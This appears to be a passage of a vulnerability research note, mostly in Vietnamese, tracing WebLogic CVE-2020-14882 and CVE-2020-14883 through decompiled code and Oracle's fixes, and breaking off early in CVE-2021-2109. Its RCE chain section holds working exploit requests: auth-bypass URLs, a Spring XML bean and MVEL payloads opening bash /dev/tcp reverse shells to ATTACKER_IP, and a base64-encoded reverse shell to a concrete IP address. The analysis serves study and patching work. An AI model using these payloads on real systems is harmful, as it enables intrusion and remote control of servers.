---
aliases:
  - CVE 14882/14883
---

# CVE-2020-14882 / CVE-2020-14883 — WebLogic Console Auth Bypass + RCE

> **Tested on**: WebLogic 12.2.1.4.0 (build 1974621), JDK 1.8.0_451, no patches

---

## 1. CVE-2020-14882 — Authentication Bypass

### 1.1. Tổng quan

| Field    | Value                                                     |
| -------- | --------------------------------------------------------- |
| Type     | Path Traversal / Authentication Bypass                    |
| CVSS     | 9.8 (Critical)                                            |
| Affected | WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0 |
| Patched  | October 2020 CPU (Patch ID: 31961038)                     |

### 1.2. Source → Sink

**Source** — HTTP Request URI. Container WebLogic parse raw request và thực hiện **decode lần 1** trong `HttpRequestParser.decodeURI()`:

```java
// HttpRequestParser.decodeURI() — DECODE LẦN 1
// File: weblogic/utils/http/HttpRequestParser.java
private void decodeURI(int uriStart, List<Integer> pathParams, int uriEnd) {
    this.requestUriStart = uriStart;                               // offset 0-2
    this.requestUriLength = uriEnd - uriStart;                     // offset 5-9
    
    // Bước 1: raw bytes → String (chưa decode %XX)
    this.requestURI = BytesToString.newString(buf, requestUriStart, 
        requestUriLength, ENCODING);                               // offset 12-31
    // requestURI = "/console/css/%252e%252e%252fconsole.portal"
    
    // Bước 2: ★ DECODE LẦN 1 — HttpParsing.unescape()
    String decoded = HttpParsing.unescape(this.requestURI, 
        getURIDecodeEncoding());                                   // offset 51-57
    // Input:  "/console/css/%252e%252e%252fconsole.portal"
    // Output: "/console/css/%2e%2e%2fconsole.portal"
    //                       ^^^  ^^^  ^^^
    //                       %25 → %  (chỉ decode 1 lần!)
    //                       %2e vẫn giữ nguyên — CHƯA thành "."
    
    // Bước 3: normalize path (resolve ../ nếu có)
    this.normalizedURI = FilenameEncoder.resolveRelativeURIPath(
        decoded, true);                                            // offset 326-333
    // normalizedURI = "/console/css/%2e%2e%2fconsole.portal"
    // → %2e%2e%2f KHÔNG phải "../" literal → KHÔNG bị resolve
    
    this.normalizedURI = HttpParsing.ensureStartingSlash(
        this.normalizedURI);                                       // offset 343-351
}
```


```java
// ServletRequestImpl — lưu kết quả decode vào relativeURI
// File: weblogic/servlet/internal/ServletRequestImpl.java
void initFromRequestParser(HttpRequestParser parser) {
    inputHelper.initFromRequestParser(parser, parameters);  // offset 0-9
    // → inputHelper lưu normalizedURI từ HttpRequestParser
    
    this.relativeURI = computeRelativeUri(
        inputHelper.getNormalizedURI());                     // offset 38-50
    // → strip context path "/console"
    // → relativeURI = "/css/%2e%2e%2fconsole.portal"
}

public String getRelativeUri() {
    return this.relativeURI;                                 // offset 0-4
    // → "/css/%2e%2e%2fconsole.portal" (chỉ decode 1 lần)
}

private String computeRelativeUri(String normalizedURI) {
    if (normalizedURI == null || context == null) return normalizedURI;
    String ctxPath = context.getContextPath();               // offset 15: "/console"
    int ctxLen = ctxPath.length();                           // offset 18: 8
    if (ctxLen == 0) return normalizedURI;
    
    // Strip context path: "/console/css/..." → "/css/..."
    return normalizedURI.substring(ctxLen);                  // offset 49-54
    // → "/css/%2e%2e%2fconsole.portal"
}
```

**Security Check** — `WebAppSecurity.checkAccess()` kiểm tra authorization dựa trên `relativeURI` ở trên (vẫn còn `%2e%2e%2f`):

```java
// WebAppSecurity.checkAccess() — entry point xác thực
// File: weblogic/servlet/security/internal/WebAppSecurity.java
public boolean checkAccess(HttpServletRequest request, HttpServletResponse response,
        boolean isInternalDispatch, boolean checkAllConstraints, boolean jaspic) 
        throws IOException, ServletException {
    
    invokePreAuthFilters(request, response);                       // offset 0-6
    
    ResourceConstraint constraint;
    if (isInternalDispatch) {
        constraint = ResourceConstraint.ALL_CONSTRAINT;            // offset 15
    } else {
        constraint = getConstraint(request);                       // offset 23 ★
        // → gọi getRelativeURI(request) để lấy path
        // → path = "/css/%2e%2e%2fconsole.portal"  (chưa decode lần 2!)
        // → dùng StandardURLMapping để match URL pattern
    }
    
    if (constraint != null && constraint.isForbidden()) {          // offset 42
        response.sendError(403);                                   // offset 123
        return false;
    }
    
    // Nếu constraint là UNRESTRICTED (không có <auth-constraint>):
    // → isAuthorized() trả về true → access GRANTED
    return delegateModule.isAuthorized(request, response, constraint, checkAllConstraints);
    //                                                              offset 189-207
}
```

```java
// WebAppSecurityWLS.getConstraint() — tìm security constraint cho URL
// File: weblogic/servlet/security/internal/WebAppSecurityWLS.java
public ResourceConstraint getConstraint(HttpServletRequest request) {
    String relativeURI = getRelativeURI(request);                  // offset 2
    // relativeURI = "/css/%2e%2e%2fconsole.portal"
    //               ^^^^
    //               vẫn bắt đầu bằng /css/ → match pattern /css/*
    
    String method = request.getMethod();                           // offset 6
    return getConstraint(relativeURI, method);                     // offset 11
}

private ResourceConstraint getConstraint(String relativeURI, String method) {
    // constraintsMap chứa URL patterns từ web.xml:
    //   "/css/*"    → ResourceConstraint (UNRESTRICTED, no auth-constraint)
    //   "/images/*" → ResourceConstraint (UNRESTRICTED)
    //   "/"         → ResourceConstraint (requires Admin/Operator/...)
    
    StandardURLMapping allMethodMapping = constraintsMap.get("");           // offset 13-21
    StandardURLMapping methodMapping = constraintsMap.get(method);          // offset 26-33
    
    // StandardURLMapping.get() thực hiện URL pattern matching:
    ResourceConstraint c1 = allMethodMapping.get(relativeURI);             // offset 45
    ResourceConstraint c2 = methodMapping.get(relativeURI);                // offset 65
    // → "/css/%2e%2e%2fconsole.portal".startsWith("/css/") == true
    // → match pattern "/css/*" → UNRESTRICTED constraint
    // → NO authentication required!
    
    return bestMatch(c1, c2);                                              // offset 111-169
}
```

```java
// WebAppSecurity.getRelativeURI() — lấy relative URI cho security check
// File: weblogic/servlet/security/internal/WebAppSecurity.java
public static final String getRelativeURI(HttpServletRequest request) {
    String webflowResource = (String) request.getAttribute("webflow_resource"); // offset 0-9
    if (webflowResource != null) return webflowResource;                        // offset 14-18
    
    if (request instanceof ServletRequestImpl) {
        return ((ServletRequestImpl) request).getRelativeUri();  // offset 30 ★
        // → trả về URI đã decode 1 lần bởi container
        // → "/css/%2e%2e%2fconsole.portal"
        // → KHÔNG decode thêm lần nào → %2e vẫn là %2e
    }
    // fallback cho non-WebLogic requests...
}
```

```java
// StandardURLMapping.get() — URL pattern matching (Servlet spec)
// File: weblogic/servlet/utils/StandardURLMapping.java
public Object get(String uri) {
    if (uri.length() == 0) uri = "/";                              // offset 0-9
    uri = cased(uri);                                              // offset 14 (lowercase nếu ignoreCase)
    
    Object result;
    // 1. Exact match + Path prefix match (/css/*)
    result = getExactOrPathMatch(uri);                             // offset 22
    if (result != null) return result;
    
    // 2. Extension match (*.jsp, *.do)
    result = getExtensionMatch(uri);                               // offset 34
    if (result != null) return result;
    
    // 3. Default mapping (/)
    return getDefault();                                           // offset 45
}
```

```java
// StandardURLMapping.getExactOrPathMatch() — tìm match trong MatchMap trie
// File: weblogic/servlet/utils/StandardURLMapping.java
protected Object getExactOrPathMatch(String uri) {
    String remaining = uri;                                        // offset 0-1
    
    // Vòng lặp: thử match từ dài → ngắn
    while (true) {
        Map.Entry entry = matchMap.match(remaining);               // offset 6-7 ★
        // → MatchMap.match() duyệt trie ký tự → ký tự
        // → trả về entry cuối cùng match được (longest prefix)
        
        if (entry == null) break;                                  // offset 12-15
        
        Node node = (Node) entry.getValue();                       // offset 18-27
        Object value = node.match(remaining);                      // offset 32 ★
        if (value != null) return value;                           // offset 37-44
        
        // Nếu node là FullMatchNode và length không khớp:
        remaining = node.shorterKey(remaining);                    // offset 48
        if (remaining == null) break;                              // offset 53-56
        // → thử prefix ngắn hơn (lastIndexOf('/'))
    }
    return null;                                                   // offset 62-63
}
```

**MatchMap — Double-Array Trie** dùng để match URL pattern:

```java
// MatchMap.match() — trie traversal, trả về longest prefix match
// File: weblogic/utils/collections/MatchMap.java
//
// Cấu trúc double-array trie:
//   base[]  — base value tại mỗi state (dùng để tính transition)
//   check[] — verify transition hợp lệ (check[t] == state → valid)
//   next[]  — state tiếp theo sau transition
//   data[]  — Entry gắn với state (null nếu state không phải endpoint)
//
public Map.Entry match(String input) {
    int state = 1;                                                  // offset 0: state ban đầu
    Entry lastMatch = data[state];                                  // offset 2-8: initial match
    int pos = 0;                                                    // offset 9-10: vị trí trong input
    int checkLen = check.length;                                    // offset 12-17
    
    // Case-sensitive path (ignoreCase == false cho URL patterns):
    int remaining = input.length();                                 // offset 112-116
    
    while (remaining > 0) {                                         // offset 118-120
        int t = base[state] + input.charAt(pos);                    // offset 123-135
        //      ^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^
        //      base offset  + char ASCII value = transition index
        
        if (t >= checkLen) break;                                   // offset 138-142
        if (check[t] != state) break;                               // offset 145-156 ★
        // → nếu transition không tồn tại → dừng, trả về lastMatch
        
        state = next[t];                                            // offset 159-166
        Entry entry = data[state];                                  // offset 167-172
        if (entry != null) {
            lastMatch = entry;                                      // offset 180-182
            // Mỗi khi gặp node có data → cập nhật lastMatch
        }
        
        pos++;                                                      // offset 183
        remaining--;                                                // offset 186
    }
    // offset 192-193: return lastMatch
    return lastMatch;
}
```

**Ví dụ cụ thể** — khi web.xml đăng ký `/css/*`:

```java
// StandardURLMapping.putPathMapping("/css/*", UNRESTRICTED_CONSTRAINT)
// File: weblogic/servlet/utils/StandardURLMapping.java
protected Object putPathMapping(String pattern, Object value) {
    // pattern = "/css/*", length = 5
    pattern = cased(pattern);                                       // offset 0-5
    int len = pattern.length();                                     // offset 7: len = 5
    
    // 1. Đăng ký prefix "/css" (bỏ "/*") → FullMatchNode
    String prefix = pattern.substring(0, len - 2);                  // offset 11-16: "/css"
    FullMatchNode existing = matchMap.get(prefix);                   // offset 21-33
    if (existing == null) {
        matchMap.put("/css", new FullMatchNode(value, len-2));      // offset 49-69
        // → Trie insert: / → c → s → s  [FullMatchNode: keyLength=3]
        // → FullMatchNode.match(): chỉ match nếu uri.length() == 3
        // → URI "/css/%2e..." length=31 ≠ 3 → KHÔNG match exact
    }
    
    // 2. Đăng ký prefix "/css/" (bỏ "*") → Node (wildcard prefix)
    String pathPrefix = pattern.substring(0, len - 1);              // offset 74-79: "/css/"
    matchMap.put("/css/", new Node(value));                          // offset 82-93
    // → Trie insert: / → c → s → s → /  [Node: patternValue = UNRESTRICTED]
    // → Node.match(): return patternValue UNCONDITIONALLY (luôn match!)
}
```

```java
// StandardURLMapping$Node.match() — WILDCARD prefix match
// File: weblogic/servlet/utils/StandardURLMapping.java
class Node {
    Object patternValue;
    
    Object match(String uri) {
        return this.patternValue;                                   // offset 0-4
        // → trả về constraint NGAY, KHÔNG kiểm tra gì thêm
        // → "/css/%2e%2e%2fconsole.portal" → return UNRESTRICTED
        // → Đây là "wildcard": mọi URI bắt đầu bằng "/css/" đều match
    }
    
    String shorterKey(String uri) {
        return null;                                                // offset 0-1
        // → Node không có fallback, prefix match là final answer
    }
}

// Đối chiếu: FullMatchNode.match() — EXACT match (chỉ dùng cho "/css" không trailing /)
class FullMatchNode extends Node {
    int keyLength;
    
    Object match(String uri) {
        if (uri.length() != this.keyLength) return null;            // offset 0-12
        // → "/css/%2e%2e%2fconsole.portal".length() = 31 ≠ 3 → null
        // → KHÔNG match exact
        
        return (exactValue != null) ? exactValue : patternValue;   // offset 13-31
    }
    
    String shorterKey(String uri) {
        // Tìm '/' cuối cùng trước keyLength → thử prefix ngắn hơn
        int idx = uri.lastIndexOf('/', keyLength - 1);              // offset 0-9
        return (idx >= 0) ? uri.substring(0, idx + 1) : null;      // offset 13-29
    }
}
```

> **Tóm tắt cơ chế match cho `/css/*`:**
> 1. `MatchMap.match("/css/%2e%2e%2fconsole.portal")` duyệt trie: `/` → `c` → `s` → `s` → `/` — tại `/css/` gặp `Node` có data → lưu làm `lastMatch`. Ký tự tiếp theo `%` không có transition trong trie → thoát vòng lặp, trả về `lastMatch` = `Node` cho `/css/`.
> 2. `Node.match()` trả về `patternValue` (UNRESTRICTED constraint) **vô điều kiện** — không kiểm tra phần còn lại `%2e%2e%2fconsole.portal`.
> 3. Kết luận: mọi URI bắt đầu bằng `/css/` đều match pattern `/css/*` bất kể nội dung phía sau. Vì `%2e%2e%2f` chưa được decode thành `../` tại thời điểm này, security check hoàn toàn không nhận biết path traversal.

---

**Sink** — `MBeanUtilsInitSingleFileServlet.service()` delegate xuống `SingleFileServlet.service()`, rồi `UIServletInternal.getTree()` thực hiện **decode lần 2** bằng `URLDecoder.decode()`:

```java
// MBeanUtilsInitSingleFileServlet.service() — entry point servlet
// File: com/bea/console/utils/MBeanUtilsInitSingleFileServlet.java
public void service(ServletRequest req, ServletResponse res) {
    if (!hasInited) { initMBean(); hasInited = true; }  // init MBean utils
    
    HttpServletRequest httpReq = (HttpServletRequest) req;
    String uri = httpReq.getRequestURI();
    if (uri.indexOf(";") > 0) {       // partial fix: block ';' in URI
        ((HttpServletResponse) res).sendError(404);
        return;
    }
    
    super.service(req, res);           // → SingleFileServlet.service()
}
```

```java
// UIServletInternal.getTree() — DECODE LẦN 2
// File: com/bea/netuix/servlets/manager/UIServletInternal.java
public static UIControl getTree(String requestPattern, UIContext ctxt, 
        boolean setContentType, ResolvedLocale resolvedLocale) 
        throws IOException, ServletException {
    HttpServletRequest request = ctxt.getServletRequest();
    HttpServletResponse response = ctxt.getServletResponse();
    
    // ★ DECODE LẦN 2 — đây là root cause của path traversal
    requestPattern = URLDecoder.decode(requestPattern, 
        containerServices.getWebappServices().getServerDefaultEncoding());
    // Input:  "/console/css/%2e%2e%2fconsole.portal"
    // Output: "/console/css/../console.portal"
    //                        ^^^
    //                        %2e%2e%2f → ../  → path traversal!
    
    requestPattern = ctxt.getL10nResourceManager().resolve(requestPattern, request, resolvedLocale);
    
    if (requestPattern.equals("/__Streaming.portal")) {
        String file = request.getParameter("file");
        return processStream(requestPattern, ctxt, file, request, response, setContentType);
    } else {
        return processStream(requestPattern, ctxt, requestPattern, 
            request, response, setContentType);
        // → resolve "/console/css/../console.portal" → "/console/console.portal"
        // → render admin console portal WITHOUT auth
    }
}
```

**Tóm tắt luồng:**

```
GET /console/css/%252e%252e%252fconsole.portal
  → Container decode lần 1: %252e → %2e                        [Source]
  → WebAppSecurity.checkAccess()                                [Security Check]
    → getRelativeURI(): "/css/%2e%2e%2fconsole.portal"
    → WebAppSecurityWLS.getConstraint()
      → StandardURLMapping.get("/css/%2e%2e%2fconsole.portal")
        → getExactOrPathMatch() → MatchMap.match()
        → prefix match: starts with "/css/"                     ★ match /css/*
        → ResourceConstraint = UNRESTRICTED (no auth-constraint)
    → isAuthorized() → true → PASS (no auth required)
  → MBeanUtilsInitSingleFileServlet.service()
    → check URI.indexOf(";") → not found → pass
    → SingleFileServlet.service()
      → UIServletInternal.getTree()                             [Sink]
        → URLDecoder.decode(): %2e%2e%2f → ../                 ★ decode lần 2
        → normalize: /console/css/../console.portal → /console/console.portal
        → render admin console page
```

### 1.3. Root Cause

Double URL encoding bypass trên security-constraint trong `web.xml`.

**web.xml** định nghĩa static resource paths không cần auth:

```xml
<security-constraint>
    <web-resource-collection>
      <web-resource-name>css</web-resource-name>
      <url-pattern>/css/*</url-pattern>           <!-- không cần auth -->
    </web-resource-collection>
</security-constraint>

<security-constraint>
    <web-resource-collection>
      <web-resource-name>console</web-resource-name>
      <url-pattern>/</url-pattern>                <!-- cần Admin/Operator/Deployer/Monitor -->
    </web-resource-collection>
    <auth-constraint>
      <role-name>Admin</role-name>
      ...
    </auth-constraint>
</security-constraint>
```

**Luồng xử lý URL:**

```
Request URL:  /console/css/%252e%252e%252fconsole.portal
                            ↓
Lần decode 1 (container):  /console/css/%2e%2e%2fconsole.portal
                            ↓
Security check:  path matches /css/*  →  BYPASS (no auth needed)
                            ↓
Lần decode 2 (SingleFileServlet):  /console/css/../console.portal
                            ↓
Path normalize:  /console/console.portal  →  renders admin console
```

Security filter (`WebAppSecurity.checkAccess()`) kiểm tra path **sau lần decode 1**, thấy `/css/*` → không cần auth. Nhưng `SingleFileServlet` decode thêm lần 2, path trở thành `/../console.portal` → traverse ra khỏi `/css/` → truy cập console.

### 1.4. Class Flow

| # | Class                                                    | Method                 | JAR                              | Vai trò                                            |
|---|----------------------------------------------------------|------------------------|----------------------------------|----------------------------------------------------|
| 1 | `weblogic.servlet.internal.ServletRequestImpl`           | `getRequestURI()`      | `com.oracle.weblogic.servlet.jar`| Parse URL, container decode 1: `%252e` → `%2e`     |
| 2 | `weblogic.servlet.security.internal.WebAppSecurity`      | `checkAccess()`        | `com.oracle.weblogic.servlet.jar`| Entry point xác thực, gọi `getConstraint()`        |
| 3 | `weblogic.servlet.security.internal.WebAppSecurity`      | `getRelativeURI()`     | `com.oracle.weblogic.servlet.jar`| Lấy relative URI (đã decode 1 lần): `/css/%2e..`   |
| 4 | `weblogic.servlet.security.internal.WebAppSecurityWLS`   | `getConstraint()`      | `com.oracle.weblogic.servlet.jar`| Tra `constraintsMap` → tìm constraint cho URI      |
| 5 | `weblogic.servlet.utils.StandardURLMapping`              | `get()` → `getExactOrPathMatch()` | `com.oracle.weblogic.servlet.jar`| Prefix match `/css/%2e..` → `/css/*` → UNRESTRICTED |
| 6 | `weblogic.servlet.internal.WebAppServletContext`         | `execute()`            | `com.oracle.weblogic.servlet.jar`| Dispatch tới servlet (auth đã pass)                |
| 7 | `com.bea.console.utils.MBeanUtilsInitSingleFileServlet` | `service()`            | `console.jar`                    | Check `;` trong URI, delegate → `SingleFileServlet`|
| 8 | `com.bea.netuix.servlets.manager.SingleFileServlet`      | `service()`            | `netuix_servlet.jar`             | Portal framework, gọi `UIServletInternal`          |
| 9 | `com.bea.netuix.servlets.manager.UIServletInternal`      | `getTree()`            | `netuix_servlet.jar`             | Decode lần 2: `URLDecoder.decode()` → `../` → RCE  |

### 1.5. Các path bypass đã biết

```
/console/css/%252e%252e%252fconsole.portal
/console/images/%252e%252e%252fconsole.portal
/console/common/%252e%252e%252fconsole.portal
/console/css/%25%32%65%25%32%65%25%32%66console.portal
/console/css/%252e%252e%252fconsolejndi.portal        (cho CVE-2021-2109)
```

Bất kỳ path nào match `/css/*`, `/images/*`, `/common/*` (static resource patterns không cần auth) đều bypass được.

### 1.6. Cách Fix (Oracle Patch)

Oracle fix bằng cách:

1. **Normalize URL trước khi check security**: decode và resolve `../` TRƯỚC khi match URL pattern → security constraint
2. **Block double-encoded characters**: Reject request chứa `%25` trong path (encoded `%`)
3. **Thêm validation** trong `SingleFileServlet`: kiểm tra path traversal trước khi serve

### 1.7. Hạn chế của Auth Bypass

CVE-2020-14882 **chỉ bypass servlet security-constraint** (web.xml), **không tạo authenticated session**:

- `request.getUserPrincipal()` = null
- `principals = []` (empty)
- Không có admin session → các chức năng cần MBean access sẽ fail với `NoAccessRuntimeException`
- **Đủ** để trigger HandleFactory (CVE-2020-14883)
- **Không đủ** để trigger MBean-dependent actions (ảnh hưởng CVE-2021-2109)

---

## 2. CVE-2020-14883 — Remote Code Execution (Post-Auth)

### 2.1. Overview

| Field    | Value                                                              |
| -------- | ------------------------------------------------------------------ |
| Type     | Remote Code Execution via unsafe class instantiation               |
| CVSS     | 7.2 (High) — requires admin access (hoặc chain CVE-2020-14882)    |
| Affected | WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0       |
| Patched  | October 2020 CPU                                                   |

### 2.2. Source → Sink

**Source** — HTTP request parameter `handle`, được portal framework (Struts/BeanUtils) đọc từ request và chuyển cho `HandleConverter`:

```java
// HandleConverter.convert() — BeanUtils Converter, bridge giữa HTTP param và HandleFactory
// File: com/bea/console/handles/HandleConverter.java
public Object convert(Class type, Object value) {
    if (Handle.class.isAssignableFrom(type)) {
        if (value instanceof String) {
            String handleString = (String) value;       // ← giá trị từ HTTP parameter "handle"
            if (handleString.equals("") || handleString.equals("null")) return null;
            Handle handle = HandleFactory.getHandle(handleString);  // → gọi HandleFactory
            return handle;
        }
    }
    // ...
}
```

**Sink** — `HandleFactory.getHandle()` → `Class.forName()` → `Constructor.newInstance()`:

```java
// HandleFactory.getHandle() — SINK: instantiate arbitrary class
// File: com/bea/console/handles/HandleFactory.java  (decompiled from bytecode)
public static Handle getHandle(String handleString) {
    // Bước 1: Replace '+' → ' ', URL decode
    handleString = handleString.replace('+', ' ');                         // offset 17-22
    String decoded = HttpParsing.unescape(handleString, "UTF-8");          // offset 26-29

    // Bước 2: Parse className và argument
    int parenIndex = decoded.indexOf('(');                                  // offset 33-36
    String className = decoded.substring(0, parenIndex);                   // offset 72-75
    String arg = decoded.substring(parenIndex + 2, decoded.length() - 2);  // offset 79-89
    //                              ^^^^^^^^^^^^     ^^^^^^^^^^^^^^^^^^
    //                              skip ("          strip ")
    
    // Bước 3: Instantiate — KHÔNG CÓ VALIDATION className!
    Class<?> clazz = Class.forName(className);                             // offset 94-95
    Object[] args = new Object[]{ arg };                                   // offset 100-108
    Constructor<?> ctor = clazz.getConstructor(String.class);              // offset 111-122
    return (Handle) ctor.newInstance(args);                                 // offset 127-134
    //                                                                     ← RCE nếu constructor có side effect
}
```

**Tóm tắt luồng:**

```
GET /console/css/%252e%252e%252fconsole.portal
    ?handle=com.tangosol.coherence.mvel2.sh.ShellSession("MVEL_CODE")

  → MBeanUtilsInitSingleFileServlet.service()          [entry point]
    → SingleFileServlet.service()                       [portal rendering]
      → Portal framework (Struts) reads "handle" param [Source — user input]
        → HandleConverter.convert(Handle.class, "com.tangosol...ShellSession(\"...\")")
          → HandleFactory.getHandle(handleString)       [Sink — no validation]
            → Class.forName("com.tangosol.coherence.mvel2.sh.ShellSession")
            → constructor.newInstance("MVEL_CODE")
            → ShellSession("<init>") evals MVEL → RCE
```

### 2.3. Root Cause

`HandleFactory.getHandle()` nhận chuỗi handle từ HTTP parameter, parse tên class và argument, rồi instantiate class bằng reflection **mà không validate class nào được phép**.

Từ bytecode (offset 94 → 134):

```java
Class<?> clazz = Class.forName(className);              // load BẤT KỲ class nào
Constructor<?> ctor = clazz.getConstructor(String.class); // tìm constructor(String)
return (Handle) ctor.newInstance(args);                    // instantiate → side effect = RCE
```

Cast `(Handle)` xảy ra **SAU** `newInstance()` — constructor đã chạy xong rồi. Dù class không implement `Handle` interface, `ClassCastException` chỉ throw sau khi code trong constructor/static block đã execute.

Bất kỳ class nào:
- Có constructor nhận `String` parameter
- Constructor thực hiện dangerous operation (eval code, load remote resource, exec command)

→ Đều có thể bị weaponize.

### 2.4. Cách Fix (Oracle Patch)

Oracle fix bằng **whitelist** — `HandleFactory.getHandle()` chỉ cho phép instantiate các class thuộc package `com.bea.console.handles.*`. Mọi class ngoài whitelist bị reject.

---

## 3. CVE-2020-14883 RCE Chains

### 3.1. Chain A — FileSystemXmlApplicationContext (phổ biến nhất)

| # | Class | Method | JAR | Vai trò |
|---|-------|--------|-----|---------|
| 1 | `HandleFactory` | `getHandle()` | `console.jar` | Instantiate class từ handle param |
| 2 | `FileSystemXmlApplicationContext` | `<init>(String)` | `com.bea.core.repackaged.springframework.spring.jar` | Load XML từ remote URL |
| 3 | Spring Bean Factory | `createBean()` | (cùng JAR) | Parse XML → tạo bean → exec command |

**Cơ chế**: Constructor nhận URL → download XML → parse bean definition → `ProcessBuilder.start()` hoặc `Runtime.exec()`.

**Yêu cầu**: HTTP server host XML file (attacker-controlled).

**Payload URL:**

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://ATTACKER_IP:PORT/poc.xml") HTTP/1.1
Host: TARGET:7001
```

**poc.xml — Reverse Shell:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

**Ưu điểm**: Reliable, command chạy qua `ProcessBuilder` (hỗ trợ shell syntax đầy đủ qua `bash -c`).
**Nhược điểm**: Cần HTTP server bên ngoài host XML.

**Variant — ClassPathXmlApplicationContext:**

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://ATTACKER_IP:PORT/poc.xml") HTTP/1.1
```

Cùng XML, cùng cơ chế. `ClassPathXmlApplicationContext` cũng nhận URL trong constructor.

### 3.2. Chain B — ShellSession (MVEL Expression Eval)

| # | Class | Method | JAR | Vai trò |
|---|-------|--------|-----|---------|
| 1 | `HandleFactory` | `getHandle()` | `console.jar` | Instantiate class từ handle param |
| 2 | `ShellSession` | `<init>(String)` | `coherence-rest.jar` | Eval MVEL expression trực tiếp |

**Cơ chế**: Constructor nhận MVEL expression string → eval ngay trong constructor → arbitrary Java code execution.

**Yêu cầu**: `coherence-rest.jar` phải có trong classpath. Không cần HTTP server bên ngoài.

**Payload — Reverse Shell:**

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(new String[]{'/bin/bash','-c','bash -i >%26 /dev/tcp/ATTACKER_IP/PORT 0>%261'})") HTTP/1.1
Host: TARGET:7001
```

> **Lưu ý URL encoding**: `&` trong URL phải encode thành `%26`, nếu không bị parse thành URL parameter separator.

**Payload — Command execution (không cần reverse shell):**

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')") HTTP/1.1
```

**Ưu điểm**: Không cần HTTP server, self-contained trong 1 request.
**Nhược điểm**: `Runtime.exec(String)` tokenize bằng whitespace — command phức tạp cần dùng `String[]` overload. Cần `coherence-rest.jar` trong classpath (có sẵn trên WebLogic 12.2.1.x).

### 3.3. Lưu ý về Runtime.exec()

`Runtime.getRuntime().exec(String cmd)` **không phải shell** — không hiểu `|`, `>`, `>&`, `/dev/tcp/...`. Hai cách xử lý:

**Cách 1 — Dùng `String[]` (khuyên dùng cho ShellSession):**

```java
Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/IP/PORT 0>&1"})
```

**Cách 2 — Dùng `{cmd,arg}` brace format (cho tool JNDI):**

Khi tool chỉ nhận 1 string command (như JNDI-Injection-Exploit):

```bash
bash -c {echo,BASE64_ENCODED_CMD}|{base64,-d}|bash
```

`{echo,BASE64}|{base64,-d}|bash` không có space → `exec()` giữ nguyên 1 token cho `-c` → bash interpret brace expansion → decode → execute.

Ví dụ:

```bash
# Encode reverse shell
echo -n "bash -i >& /dev/tcp/13.228.171.119/18422 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMy4yMjguMTcxLjExOS8xODQyMiAwPiYx

# Command cho tool:
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMy4yMjguMTcxLjExOS8xODQyMiAwPiYx}|{base64,-d}|bash
```

### 3.4. Tổng hợp Chains

| Chain | Class | Cần HTTP server? | Có trên WLS 12.2.1.4? |
|-------|-------|-------------------|------------------------|
| FileSystemXmlApplicationContext | `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` | **Có** | **Có** |
| ClassPathXmlApplicationContext | `com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext` | **Có** | **Có** |
| ShellSession (MVEL) | `com.tangosol.coherence.mvel2.sh.ShellSession` | **Không** | **Có** (coherence-rest.jar) |

---

## 4. CVE-2021-2109 — JNDI Injection (kết hợp CVE-2020-14882)

### 4.1. Overview

| Field    | Value                                                              |
| -------- | ------------------------------------------------------------------ |
| Type     | JNDI Injection via Admin Console JNDI Tree Browser                 |
| CVSS     | 7.2 (High) — requires authenticated admin access                   |
| Affected | WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0       |
| Patched  | January 2021 CPU                                                   |

### 4.2. Source → Sink

**Source** — HTTP parameter `JNDIBindingPortlethandle` trong `consolejndi.portal`, đi qua cùng cơ chế `HandleFactory` → `HandleConverter` như CVE-2020-14883, nhưng parameter name khác (portal framework map portlet instance label `JNDIBindingPortlet` + `handle` suffix):

```java
// consolejndi.portal — portlet definition
// <netuix:portletInstance instanceLabel="JNDIBindingPortlet" ...>
//   → parameter name = "JNDIBindingPortlethandle"

// HandleFactory.getHandle() instantiate JndiBindingHandle:
HandleFactory.getHandle("com.bea.console.handles.JndiBindingHandle(\"ldap://192.168.0;10:1389/dc=a;AdminServer\")")
  → Class.forName("com.bea.console.handles.JndiBindingHandle")
  → constructor.newInstance("ldap://192.168.0;10:1389/dc=a;AdminServer")
  → JndiBindingHandle.setObjectIdentifier("ldap://192.168.0;10:1389/dc=a;AdminServer")
```

**Sink** — `JNDIBindingAction.execute()` gọi `InitialContext.lookup()` với LDAP URL do attacker kiểm soát:

```java
// JNDIBindingAction.execute()  (decompiled, line ~83)
JndiBindingHandle handle = (JndiBindingHandle) getHandleContext(form, request, "JNDIBinding");

String context = handle.getContext();    // → getComponent(0) → "ldap://192.168.0"
String binding = handle.getBinding();    // → getComponent(1) → "10:1389/dc=a"
String server  = handle.getServer();     // → getComponent(2) → "AdminServer"

ServerMBean serverMBean = MBeanUtils.getAnyServerMBean(server);
Context namingContext = ConsoleUtils.initNamingContext(serverMBean);

if (context.length() > 0 && binding.length() > 0)
    context = context + ".";             // → "ldap://192.168.0."

